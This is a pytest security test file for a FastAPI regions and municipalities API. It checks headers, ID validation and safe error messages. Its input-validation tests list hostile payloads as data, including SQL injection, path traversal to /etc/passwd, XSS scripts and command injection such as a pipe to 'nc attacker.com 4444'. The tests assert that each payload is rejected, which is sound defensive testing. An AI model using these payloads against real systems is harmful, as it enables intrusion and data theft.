# coding=utf-8
"""
Security Tests for API Endpoints
=================================

SIN_CARRETA: Validate security requirements:
- Security headers present and correct
- Input validation prevents injection attacks
- Rate limiting (if implemented)
- Auth scopes (if implemented)
- CORS configuration

Author: FARFAN 3.0 Team
Version: 1.0.0
Python: 3.10+
"""

import pytest
from fastapi.testclient import TestClient
from api.main import app

client = TestClient(app)


class TestSecurityHeaders:
    """Test security headers are present in responses"""
    
    def test_telemetry_headers_present(self):
        """SIN_CARRETA: Response includes telemetry headers"""
        response = client.get("/api/v1/pdet/regions")
        
        assert "X-Request-ID" in response.headers, "Missing X-Request-ID header"
        assert "X-Response-Time-Ms" in response.headers, "Missing X-Response-Time-Ms header"
        
        # Validate header values
        assert len(response.headers["X-Request-ID"]) > 0
        assert float(response.headers["X-Response-Time-Ms"]) > 0
    
    def test_content_type_header(self):
        """SIN_CARRETA: Response includes correct Content-Type"""
        response = client.get("/api/v1/pdet/regions")
        
        assert "content-type" in response.headers
        assert "application/json" in response.headers["content-type"]
    
    def test_consistent_headers_across_endpoints(self):
        """SIN_CARRETA: All endpoints return consistent security headers"""
        endpoints = [
            "/",
            "/health",
            "/api/v1/pdet/regions",
            "/api/v1/pdet/regions/REGION_001",
            "/api/v1/municipalities/MUN_00101",
        ]
        
        for endpoint in endpoints:
            response = client.get(endpoint)
            assert "X-Request-ID" in response.headers, f"Missing header on {endpoint}"
            assert "X-Response-Time-Ms" in response.headers, f"Missing header on {endpoint}"


class TestInputValidation:
    """Test input validation prevents malicious inputs"""
    
    def test_sql_injection_prevention(self):
        """SIN_CARRETA: SQL injection attempts are rejected"""
        malicious_inputs = [
            "REGION_001'; DROP TABLE regions;--",
            "REGION_001' OR '1'='1",
            "REGION_001 UNION SELECT * FROM users",
        ]
        
        for malicious_input in malicious_inputs:
            response = client.get(f"/api/v1/pdet/regions/{malicious_input}")
            # Should return 400 (validation error) or 404 (not found), not 500 or success
            assert response.status_code in [400, 404], \
                f"Malicious input '{malicious_input}' not properly rejected"
    
    def test_path_traversal_prevention(self):
        """SIN_CARRETA: Path traversal attempts are rejected"""
        malicious_inputs = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "REGION_001/../../../etc/passwd",
        ]
        
        for malicious_input in malicious_inputs:
            response = client.get(f"/api/v1/pdet/regions/{malicious_input}")
            assert response.status_code in [400, 404], \
                f"Path traversal attempt '{malicious_input}' not properly rejected"
    
    def test_xss_prevention(self):
        """SIN_CARRETA: XSS attempts are rejected"""
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "REGION_001<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
        ]
        
        for malicious_input in malicious_inputs:
            response = client.get(f"/api/v1/pdet/regions/{malicious_input}")
            assert response.status_code in [400, 404], \
                f"XSS attempt '{malicious_input}' not properly rejected"
    
    def test_command_injection_prevention(self):
        """SIN_CARRETA: Command injection attempts are rejected"""
        malicious_inputs = [
            "REGION_001; ls -la",
            "REGION_001 && cat /etc/passwd",
            "REGION_001 | nc attacker.com 4444",
        ]
        
        for malicious_input in malicious_inputs:
            response = client.get(f"/api/v1/pdet/regions/{malicious_input}")
            assert response.status_code in [400, 404], \
                f"Command injection '{malicious_input}' not properly rejected"
    
    def test_buffer_overflow_prevention(self):
        """SIN_CARRETA: Extremely long inputs are rejected"""
        # Try with very long input
        long_input = "REGION_" + "A" * 10000
        response = client.get(f"/api/v1/pdet/regions/{long_input}")
        assert response.status_code in [400, 404, 414], \
            "Extremely long input not properly rejected"
    
    def test_null_byte_injection_prevention(self):
        """SIN_CARRETA: Null byte injection attempts are rejected"""
        # Test URL-encoded null byte (actual null bytes cause httpx errors)
        malicious_inputs = [
            "REGION_001%00.txt",
            "REGION_001%00",
        ]
        
        for malicious_input in malicious_inputs:
            try:
                response = client.get(f"/api/v1/pdet/regions/{malicious_input}")
                assert response.status_code in [400, 404], \
                    f"Null byte injection '{malicious_input}' not properly rejected"
            except Exception:
                # If request itself fails, that's also acceptable (client-side rejection)
                pass
    
    def test_unicode_exploits_prevention(self):
        """SIN_CARRETA: Unicode exploitation attempts are rejected"""
        malicious_inputs = [
            "REGION_001\u202e",  # Right-to-left override
            "REGION_001\uFEFF",  # Zero-width no-break space
        ]
        
        for malicious_input in malicious_inputs:
            response = client.get(f"/api/v1/pdet/regions/{malicious_input}")
            assert response.status_code in [400, 404], \
                f"Unicode exploit '{malicious_input}' not properly rejected"


class TestIDFormatValidation:
    """Test strict ID format validation"""
    
    def test_region_id_format_enforcement(self):
        """SIN_CARRETA: Region IDs must match REGION_\d{3} pattern"""
        invalid_ids = [
            "REGION_1",      # Too short
            "REGION_0001",   # Too long
            "REGION_ABC",    # Non-numeric
            "region_001",    # Wrong case
            "REG_001",       # Wrong prefix
            "REGION001",     # Missing underscore
        ]
        
        for invalid_id in invalid_ids:
            response = client.get(f"/api/v1/pdet/regions/{invalid_id}")
            assert response.status_code == 400, \
                f"Invalid region ID '{invalid_id}' should return 400, got {response.status_code}"
    
    def test_municipality_id_format_enforcement(self):
        """SIN_CARRETA: Municipality IDs must match MUN_\d{5} pattern"""
        invalid_ids = [
            "MUN_001",       # Too short
            "MUN_000001",    # Too long
            "MUN_ABCDE",     # Non-numeric
            "mun_00101",     # Wrong case
            "MUNI_00101",    # Wrong prefix
            "MUN00101",      # Missing underscore
        ]
        
        for invalid_id in invalid_ids:
            response = client.get(f"/api/v1/municipalities/{invalid_id}")
            assert response.status_code == 400, \
                f"Invalid municipality ID '{invalid_id}' should return 400, got {response.status_code}"
    
    def test_valid_id_ranges(self):
        """SIN_CARRETA: Only valid ID ranges are accepted"""
        # Region IDs 001-010 are valid
        response = client.get("/api/v1/pdet/regions/REGION_001")
        assert response.status_code == 200
        
        response = client.get("/api/v1/pdet/regions/REGION_010")
        assert response.status_code == 200
        
        # Outside range should 404
        response = client.get("/api/v1/pdet/regions/REGION_011")
        assert response.status_code == 404


class TestErrorHandling:
    """Test secure error handling"""
    
    def test_error_responses_no_stack_traces(self):
        """SIN_CARRETA: Error responses don't leak stack traces"""
        # Try various invalid inputs
        response = client.get("/api/v1/pdet/regions/INVALID")
        assert response.status_code == 400
        
        data = response.json()
        # Should have error info but not stack traces
        assert "error" in data or "detail" in data
        # Common stack trace indicators should not be present
        response_text = str(data).lower()
        assert "traceback" not in response_text
        assert "file \"" not in response_text
        assert "line " not in response_text[:100]  # Check first 100 chars
    
    def test_404_errors_no_information_disclosure(self):
        """SIN_CARRETA: 404 errors don't disclose system information"""
        response = client.get("/api/v1/pdet/regions/REGION_999")
        assert response.status_code == 404
        
        data = response.json()
        # Should be generic error, not reveal file paths or internal details
        response_text = str(data).lower()
        assert "/home/" not in response_text
        assert "/usr/" not in response_text
        assert "c:\\" not in response_text.lower()
    
    def test_validation_errors_are_safe(self):
        """SIN_CARRETA: Validation errors don't reveal sensitive info"""
        response = client.get("/api/v1/pdet/regions/MALICIOUS_INPUT")
        assert response.status_code == 400
        
        data = response.json()
        # Check that error message is informative but safe
        assert "error" in data or "detail" in data
        # Should not contain user input verbatim to prevent reflection attacks
        assert "MALICIOUS_INPUT" not in str(data) or "invalid" in str(data).lower()


class TestDataIntegrity:
    """Test that data integrity is maintained under security scenarios"""
    
    def test_concurrent_requests_data_consistency(self):
        """SIN_CARRETA: Concurrent requests don't corrupt data"""
        import concurrent.futures
        
        def get_region_data(region_id):
            response = client.get(f"/api/v1/pdet/regions/{region_id}")
            if response.status_code == 200:
                return response.json()["region"]
            return None
        
        # Make concurrent requests for same region
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(get_region_data, "REGION_001") for _ in range(10)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        # All results should be identical (excluding timestamps)
        results = [r for r in results if r is not None]
        assert len(results) == 10
        
        first_result = results[0]
        for result in results[1:]:
            # Compare core data fields
            assert result["id"] == first_result["id"]
            assert result["name"] == first_result["name"]
            assert result["coordinates"] == first_result["coordinates"]
            assert result["overall_score"] == first_result["overall_score"]
            assert result["dimension_scores"] == first_result["dimension_scores"]
            assert result["policy_area_scores"] == first_result["policy_area_scores"]
    
    def test_data_not_modified_by_read_operations(self):
        """SIN_CARRETA: Read operations don't modify data"""
        # Get data twice
        response1 = client.get("/api/v1/pdet/regions/REGION_001")
        data1 = response1.json()["region"]
        
        response2 = client.get("/api/v1/pdet/regions/REGION_001")
        data2 = response2.json()["region"]
        
        # Compare core data (excluding timestamps which will naturally differ)
        assert data1["id"] == data2["id"]
        assert data1["name"] == data2["name"]
        assert data1["coordinates"] == data2["coordinates"]
        assert data1["overall_score"] == data2["overall_score"]
        assert data1["dimension_scores"] == data2["dimension_scores"]
        assert data1["policy_area_scores"] == data2["policy_area_scores"]
